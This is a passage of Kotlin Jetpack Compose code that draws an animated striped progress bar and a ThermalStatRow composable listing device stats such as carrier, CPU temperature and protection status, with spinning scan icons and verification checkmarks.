                var startX = offset - totalWidth - tilt
                val path = androidx.compose.ui.graphics.Path()
                
                while (startX < size.width + tilt) {
                    path.moveTo(startX, size.height)
                    path.lineTo(startX + stripeWidth, size.height)
                    path.lineTo(startX + stripeWidth + tilt, 0f)
                    path.lineTo(startX + tilt, 0f)
                    path.close()
                    
                    drawPath(
                        path = path,
                        color = Color.Gray.copy(alpha = 0.5f)
                    )
                    
                    path.reset()
                    startX += totalWidth
                }
            }
        }
    } else {
        LinearProgressIndicator(
            progress = { progress },
            modifier = modifier
                .fillMaxWidth()
                .height(6.dp)
                .clip(CircleShape),
            color = color,
            trackColor = trackColor,
            strokeCap = androidx.compose.ui.graphics.StrokeCap.Round
        )
    }
}

@Composable
fun ThermalStatRow(
    label: String, 
    value: String, 
    isEngaged: Boolean,
    isScanning: Boolean = false,
    checkColor: Color = AccentBlue,
    useIpFormatting: Boolean = false,
    customValueColor: Color? = null,
    showCheckmark: Boolean = true
) {
    val configuration = androidx.compose.ui.platform.LocalConfiguration.current
    val isCompactHeight = configuration.screenHeightDp < 740
    val rowVerticalPadding = if (isCompactHeight) 1.dp else 4.dp
    val iconBoxSize = if (isCompactHeight) 20.dp else 26.dp
    val innerIconSize = if (isCompactHeight) 11.dp else 15.dp
    val textFontSize = if (isCompactHeight) 12.sp else 14.sp
    val textIconSpacing = if (isCompactHeight) 4.dp else 10.dp

    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = rowVerticalPadding),
        horizontalArrangement = Arrangement.SpaceBetween,
        verticalAlignment = Alignment.CenterVertically
    ) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            val (rowIcon, bgTint) = when (label) {
                "Device" -> Icons.Default.Info to Color(0xFF007AFF).copy(alpha = 0.1f)
                "Android Version" -> Icons.Default.Settings to Color(0xFF5856D6).copy(alpha = 0.1f)
                "Carrier" -> Icons.Default.Settings to Color(0xFF34C759).copy(alpha = 0.1f)
                "Network Connection" -> Icons.Default.Settings to Color(0xFFFF9500).copy(alpha = 0.1f)
                "CPU Temperature" -> Icons.Default.Info to Color(0xFFFF2D55).copy(alpha = 0.1f)
                "Battery Status" -> Icons.Default.Info to Color(0xFF4CD964).copy(alpha = 0.1f)
                "Protection Status" -> Icons.Default.CheckCircle to Color(0xFF30B0C7).copy(alpha = 0.1f)
                "Core Framework" -> Icons.Default.CheckCircle to Color(0xFF536DFE).copy(alpha = 0.1f)
                else -> Icons.Default.Settings to Color(0x1F000000)
            }
            
            Box(
                modifier = Modifier
                    .size(iconBoxSize)
                    .background(bgTint, shape = RoundedCornerShape(6.dp)),
                contentAlignment = Alignment.Center
            ) {
                val infiniteLeft = rememberInfiniteTransition(label = "left_sync")
                val leftRot by infiniteLeft.animateFloat(
                    initialValue = 0f,
                    targetValue = 360f,
                    animationSpec = infiniteRepeatable(
                        animation = tween(1500, easing = LinearEasing),
                        repeatMode = RepeatMode.Restart
                    ),
                    label = "left_rotate"
                )
                Icon(
                    imageVector = if (isScanning) Icons.Default.Refresh else rowIcon,
                    contentDescription = null,
                    tint = if (isEngaged && !isScanning) AccentBlue else TextSecondary,
                    modifier = Modifier
                        .size(innerIconSize)
                        .graphicsLayer { rotationZ = if (isScanning) leftRot else 0f }
                )
            }
            Spacer(modifier = Modifier.width(textIconSpacing))
            Text(text = label, color = TextPrimary, fontSize = textFontSize, fontWeight = FontWeight.Medium)
        }
        
        Row(verticalAlignment = Alignment.CenterVertically) {
            val isStandby = value == "Standby..." || value == "Unknown"
            val isScanningValue = isScanning
            
            val pulseTransition = rememberInfiniteTransition(label = "pulse")
            val textAlpha by pulseTransition.animateFloat(
                initialValue = 0.4f,
                targetValue = 1f,
                animationSpec = infiniteRepeatable(
                    animation = tween(650, easing = FastOutSlowInEasing),
                    repeatMode = RepeatMode.Reverse
                ),
                label = "textAlpha"
            )

            if (useIpFormatting) {
                val ipAnnotatedText = buildAnnotatedString {
                    value.forEach { char ->
                        if (char.isDigit() || char == '.') {
                            withStyle(style = SpanStyle(color = if (isStandby) TextSecondary else AccentBlue, fontWeight = FontWeight.Bold)) {
                                append(char)
                            }
                        } else {
                            withStyle(style = SpanStyle(color = if (isStandby) TextSecondary else TextPrimary)) {
                                append(char)
                            }
                        }
                    }
                }
                Text(
                    text = ipAnnotatedText,
                    fontSize = textFontSize, 
                    fontWeight = FontWeight.SemiBold,
                    modifier = Modifier.graphicsLayer { alpha = if (isScanningValue) textAlpha else 1f }
                )
            } else {
                Text(
                    text = value, 
                    color = when {
                        isStandby -> TextSecondary
                        isScanningValue -> TextPrimary
                        customValueColor != null -> customValueColor
                        value == "Active" || value == "Running" -> AccentBlue
                        else -> TextPrimary
                    }, 
                    fontSize = textFontSize, 
                    fontWeight = FontWeight.SemiBold,
                    modifier = Modifier.graphicsLayer { alpha = if (isScanningValue) textAlpha else 1f }
                )
            }
            
            Spacer(modifier = Modifier.width(6.dp))
            
            val infiniteRight = rememberInfiniteTransition(label = "sync")
            val rightRot by infiniteRight.animateFloat(
                initialValue = 0f,
                targetValue = 360f,
                animationSpec = infiniteRepeatable(
                    animation = tween(2000, easing = LinearEasing),
                    repeatMode = RepeatMode.Restart
                ),
                label = "rotate"
            )

            val rightIconSize = if (isCompactHeight) 11.dp else 14.dp

            if (isScanningValue) {
                Icon(
                    imageVector = Icons.Default.Refresh,
                    contentDescription = "Scanning",
                    tint = TextPrimary,
                    modifier = Modifier
                        .size(rightIconSize)
                        .graphicsLayer { rotationZ = rightRot }
                )
            } else if (showCheckmark && !isStandby) {
                Icon(
                    imageVector = Icons.Default.CheckCircle,
                    contentDescription = "Verified",
                    tint = checkColor,
                    modifier = Modifier.size(rightIconSize)
                )
            }
        }
    }
}
